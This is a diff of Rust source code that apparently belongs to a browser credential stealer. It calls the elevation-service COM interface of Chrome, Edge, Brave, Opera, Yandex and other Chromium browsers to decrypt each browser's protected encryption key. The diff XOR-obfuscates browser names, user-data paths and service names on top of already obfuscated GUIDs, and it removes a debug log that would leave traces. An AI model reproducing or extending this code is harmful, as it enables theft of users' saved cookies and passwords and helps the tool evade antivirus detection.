@@ -1,14 +1,86 @@
-//! IElevator COM interface — with obfuscated GUIDs (XOR 0xAA)
-
 #![allow(non_snake_case, non_camel_case_types)]
 
 use std::ffi::c_void;
 use std::sync::OnceLock;
 
-// ============ OBFUSCATION ============
 const XOR_KEY: u8 = 0xAA;
+const STR_XOR_KEY: u8 = 0x5A;
 
-/// Decode an obfuscated byte slice into a GUID (XOR with 0xAA)
+fn xor_str(data: &[u8]) -> String {
+    String::from_utf8(data.iter().map(|&b| b ^ STR_XOR_KEY).collect()).unwrap_or_default()
+}
+
+fn s_chrome() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F]) }
+fn s_chrome_beta() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x18, 0x3F, 0x2E, 0x3B]) }
+fn s_chrome_dev() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x1E, 0x3F, 0x2C]) }
+fn s_chrome_canary() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x19, 0x3B, 0x34, 0x3B, 0x28, 0x23]) }
+fn s_brave() -> String { xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F]) }
+fn s_edge() -> String { xor_str(&[0x1F, 0x3E, 0x3D, 0x3F]) }
+fn s_vivaldi() -> String { xor_str(&[0x0C, 0x33, 0x2C, 0x3B, 0x36, 0x3E, 0x33]) }
+fn s_opera() -> String { xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B]) }
+fn s_yandex() -> String { xor_str(&[0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22]) }
+fn s_chromium() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37]) }
+
+fn s_google_chrome_user_data() -> String {
+    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x06, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
+}
+fn s_google_chrome_beta_user_data() -> String {
+    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x06, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x18, 0x3F, 0x2E, 0x3B, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
+}
+fn s_google_chrome_dev_user_data() -> String {
+    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x06, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x1E, 0x3F, 0x2C, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
+}
+fn s_google_chrome_sxs_user_data() -> String {
+    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x06, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x09, 0x22, 0x09, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
+}
+fn s_brave_user_data() -> String {
+    xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x09, 0x35, 0x3C, 0x2E, 0x2D, 0x3B, 0x28, 0x3F, 0x06, 0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x77, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
+}
+fn s_edge_user_data() -> String {
+    xor_str(&[0x17, 0x33, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3C, 0x2E, 0x06, 0x1F, 0x3E, 0x3D, 0x3F, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
+}
+fn s_vivaldi_user_data() -> String {
+    xor_str(&[0x0C, 0x33, 0x2C, 0x3B, 0x36, 0x3E, 0x33, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
+}
+fn s_opera_user_data() -> String {
+    xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B, 0x7A, 0x09, 0x35, 0x3C, 0x2E, 0x2D, 0x3B, 0x28, 0x3F, 0x06, 0x15, 0x2A, 0x3F, 0x28, 0x3B, 0x7A, 0x09, 0x2E, 0x3B, 0x38, 0x36, 0x3F])
+}
+fn s_yandex_user_data() -> String {
+    xor_str(&[0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22, 0x06, 0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
+}
+fn s_chromium_user_data() -> String {
+    xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
+}
+
+fn s_google_chrome_elevation() -> String {
+    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
+}
+fn s_google_chrome_beta_elevation() -> String {
+    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x18, 0x3F, 0x2E, 0x3B, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
+}
+fn s_google_chrome_dev_elevation() -> String {
+    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x1E, 0x3F, 0x2C, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
+}
+fn s_google_chrome_canary_elevation() -> String {
+    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x19, 0x3B, 0x34, 0x3B, 0x28, 0x23, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
+}
+fn s_brave_elevation() -> String { xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F]) }
+fn s_edge_elevation() -> String {
+    xor_str(&[0x17, 0x33, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3C, 0x2E, 0x1F, 0x3E, 0x3D, 0x3F, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
+}
+fn s_vivaldi_elevation() -> String {
+    xor_str(&[0x0C, 0x33, 0x2C, 0x3B, 0x36, 0x3E, 0x33, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
+}
+fn s_opera_elevation() -> String {
+    xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
+}
+fn s_yandex_elevation() -> String {
+    xor_str(&[0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
+}
+fn s_chromium_elevation() -> String {
+    xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
+}
+
 fn xor_guid(data: &[u8]) -> GUID {
     let bytes: Vec<u8> = data.iter().map(|&b| b ^ XOR_KEY).collect();
     let data1 = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
@@ -249,13 +321,13 @@ fn get_clsid_brave() -> GUID { xor_guid(CLSID_BRAVE_XOR) }
 fn get_clsid_edge() -> GUID { xor_guid(CLSID_EDGE_XOR) }
 
 // ============ Browser configs ============
-#[derive(Clone, Copy)]
+#[derive(Clone)]
 pub struct BrowserCom {
-    pub name: &'static str,
+    pub name: String,
     pub clsid: GUID,
     pub iids: &'static [GUID],
-    pub user_data_rel: &'static str,
-    pub service_name: &'static str,
+    pub user_data_rel: String,
+    pub service_name: String,
 }
 
 // Because we can't have static BrowserCom with non-const fields, we'll use a function that returns a list of BrowserCom.
@@ -264,69 +336,68 @@ pub fn all_browsers() -> &'static [BrowserCom] {
     BROWSERS.get_or_init(|| {
         vec![
             BrowserCom {
-                name: "Chrome",
+                name: s_chrome(),
                 clsid: get_clsid_generic(),
                 iids: chrome_iids(),
-                user_data_rel: r"Google\Chrome\User Data",
-                service_name: "GoogleChromeElevationService",
+                user_data_rel: s_google_chrome_user_data(),
+                service_name: s_google_chrome_elevation(),
             },
             BrowserCom {
-                name: "Chrome Beta",
+                name: s_chrome_beta(),
                 clsid: get_clsid_chrome_beta(),
                 iids: chrome_beta_iids(),
-                user_data_rel: r"Google\Chrome Beta\User Data",
-                service_name: "GoogleChromeBetaElevationService",
+                user_data_rel: s_google_chrome_beta_user_data(),
+                service_name: s_google_chrome_beta_elevation(),
             },
             BrowserCom {
-                name: "Chrome Dev",
+                name: s_chrome_dev(),
                 clsid: get_clsid_chrome_dev(),
                 iids: chrome_dev_iids(),
-                user_data_rel: r"Google\Chrome Dev\User Data",
-                service_name: "GoogleChromeDevElevationService",
+                user_data_rel: s_google_chrome_dev_user_data(),
+                service_name: s_google_chrome_dev_elevation(),
             },
             BrowserCom {
-                name: "Chrome Canary",
+                name: s_chrome_canary(),
                 clsid: get_clsid_chrome_canary(),
                 iids: chrome_canary_iids(),
-                user_data_rel: r"Google\Chrome SxS\User Data",
-                service_name: "GoogleChromeCanaryElevationService",
+                user_data_rel: s_google_chrome_sxs_user_data(),
+                service_name: s_google_chrome_canary_elevation(),
             },
             BrowserCom {
-                name: "Brave",
+                name: s_brave(),
                 clsid: get_clsid_brave(),
                 iids: brave_iids(),
-                user_data_rel: r"BraveSoftware\Brave-Browser\User Data",
-                service_name: "BraveElevationService",
+                user_data_rel: s_brave_user_data(),
+                service_name: s_brave_elevation(),
             },
             BrowserCom {
-                name: "Edge",
+                name: s_edge(),
                 clsid: get_clsid_edge(),
                 iids: edge_iids(),
-                user_data_rel: r"Microsoft\Edge\User Data",
-                service_name: "MicrosoftEdgeElevationService",
+                user_data_rel: s_edge_user_data(),
+                service_name: s_edge_elevation(),
             },
             BrowserCom {
-                name: "Vivaldi",
+                name: s_vivaldi(),
                 clsid: get_clsid_generic(),
                 iids: generic_chromium_iids(),
-                user_data_rel: r"Vivaldi\User Data",
-                service_name: "VivaldiElevationService",
+                user_data_rel: s_vivaldi_user_data(),
+                service_name: s_vivaldi_elevation(),
             },
             BrowserCom {
-                name: "Opera",
+                name: s_opera(),
                 clsid: get_clsid_generic(),
                 iids: generic_chromium_iids(),
-                user_data_rel: r"Opera Software\Opera Stable",
-                service_name: "OperaElevationService",
+                user_data_rel: s_opera_user_data(),
+                service_name: s_opera_elevation(),
             },
             BrowserCom {
-                name: "Yandex",
+                name: s_yandex(),
                 clsid: get_clsid_generic(),
                 iids: generic_chromium_iids(),
-                user_data_rel: r"Yandex\YandexBrowser\User Data",
-                service_name: "YandexBrowserElevationService",
+                user_data_rel: s_yandex_user_data(),
+                service_name: s_yandex_elevation(),
             },
-            // etc. (you can add other browsers like CentBrowser etc. if needed)
         ]
     })
     .as_slice()
@@ -336,12 +407,17 @@ pub fn all_browsers() -> &'static [BrowserCom] {
 // We also keep the `GENERIC_CHROMIUM` for fallback, but now we use a function.
 pub fn generic_chromium() -> BrowserCom {
     BrowserCom {
-        name: "Chromium",
+        name: s_chromium(),
         clsid: get_clsid_generic(),
         iids: generic_chromium_iids(),
-        user_data_rel: r"Chromium\User Data",
-        service_name: "ChromiumElevationService",
+        user_data_rel: s_chromium_user_data(),
+        service_name: s_chromium_elevation(),
     }
+}
+
+fn generic_chromium_ref() -> &'static BrowserCom {
+    static ENTRY: OnceLock<BrowserCom> = OnceLock::new();
+    ENTRY.get_or_init(generic_chromium)
 }
 
 /// Detect browser from executable path (unchanged, but uses all_browsers())
@@ -349,19 +425,19 @@ pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
     let exe = exe_path.to_lowercase();
 
     if exe.contains("brave") {
-        return all_browsers().iter().find(|b| b.name == "Brave");
+        return all_browsers().iter().find(|b| b.name == s_brave());
     }
     if exe.contains("msedge") || (exe.contains("edge") && !exe.contains("chrome")) {
-        return all_browsers().iter().find(|b| b.name == "Edge");
+        return all_browsers().iter().find(|b| b.name == s_edge());
     }
     if exe.contains("vivaldi") {
-        return all_browsers().iter().find(|b| b.name == "Vivaldi");
+        return all_browsers().iter().find(|b| b.name == s_vivaldi());
     }
     if exe.contains("opera") {
-        return all_browsers().iter().find(|b| b.name == "Opera");
+        return all_browsers().iter().find(|b| b.name == s_opera());
     }
     if exe.contains("yandex") {
-        return all_browsers().iter().find(|b| b.name == "Yandex");
+        return all_browsers().iter().find(|b| b.name == s_yandex());
     }
     if exe.contains("coccoc") || exe.contains("360chrome") || exe.contains("epic")
         || exe.contains("uran") || exe.contains("7star") || exe.contains("torch")
@@ -369,42 +445,28 @@ pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
         || exe.contains("sputnik") || exe.contains("slimjet") || exe.contains("iridium")
         || exe.contains("thorium") || exe.contains("centbrowser") || exe.contains("\\arc\\")
     {
-        return Some(&generic_chromium());
+        return Some(generic_chromium_ref());
     }
     if exe.contains("chrome") {
         if exe.contains("chrome sxs") || exe.contains("\\sxs\\") {
-            return all_browsers().iter().find(|b| b.name == "Chrome Canary");
+            return all_browsers().iter().find(|b| b.name == s_chrome_canary());
         }
         if exe.contains("chrome dev") {
-            return all_browsers().iter().find(|b| b.name == "Chrome Dev");
+            return all_browsers().iter().find(|b| b.name == s_chrome_dev());
         }
         if exe.contains("chrome beta") {
-            return all_browsers().iter().find(|b| b.name == "Chrome Beta");
+            return all_browsers().iter().find(|b| b.name == s_chrome_beta());
         }
         if exe.contains("chromium") && !exe.contains("google") {
-            return Some(&generic_chromium());
+            return Some(generic_chromium_ref());
         }
-        return all_browsers().iter().find(|b| b.name == "Chrome");
+        return all_browsers().iter().find(|b| b.name == s_chrome());
     }
 
     None
 }
 
-// ============ Original COM code (unchanged) ============
-const PUBLIC_DEBUG: &str = r"C:\Users\Public\cr_debug.log";
-
-fn debug_log(msg: &str) {
-    use std::io::Write;
-    if let Ok(mut f) = std::fs::OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open(PUBLIC_DEBUG)
-    {
-        let _ = writeln!(f, "{msg}");
-    }
-}
-
-fn guid_to_string(g: &GUID) -> String {
+// ============ Original COM code ============
     format!(
         "{{{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}}}",
         g.data1, g.data2, g.data3,
@@ -528,9 +590,9 @@ unsafe fn try_all_browsers(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
             Err(e) => last = format!("{}: {e}", b.name),
         }
     }
-    match try_browser(&generic_chromium(), encrypted_key) {
+    match try_browser(generic_chromium_ref(), encrypted_key) {
         Ok(key) => return Ok(key),
-        Err(e) => last = format!("Chromium: {e}"),
+        Err(e) => last = format!("{}: {e}", s_chromium()),
     }
     Err(format!("all browsers failed; last: {last}"))
 }
@@ -541,16 +603,11 @@ unsafe fn try_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<
     let mut saw_class_not_reg = false;
 
     for &iid in browser.iids {
-        let iid_str = guid_to_string(&iid);
-        debug_log(&format!("try CoCreateInstance {} IID {iid_str}", browser.name));
-
         match try_one(encrypted_key, &browser.clsid, &iid) {
             Ok(key) => {
-                debug_log(&format!("DecryptData OK via IID {iid_str}"));
                 return Ok(key);
             }
             Err(e) => {
-                debug_log(&format!("  failed: {e}"));
                 if e.contains("0x80004002") { saw_no_interface = true; }
                 if e.contains("0x80040154") || e.contains("0x80040111") { saw_class_not_reg = true; }
                 last = e;
@@ -638,7 +695,7 @@ unsafe fn try_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, Strin
         EOAC_DYNAMIC_CLOAKING,
     );
     if hr_pb < 0 {
-        debug_log(&format!("CoSetProxyBlanket 0x{hr_pb:08X}"));
+        let _ = hr_pb;
     }
 
     let elev = punk as *mut IElev;
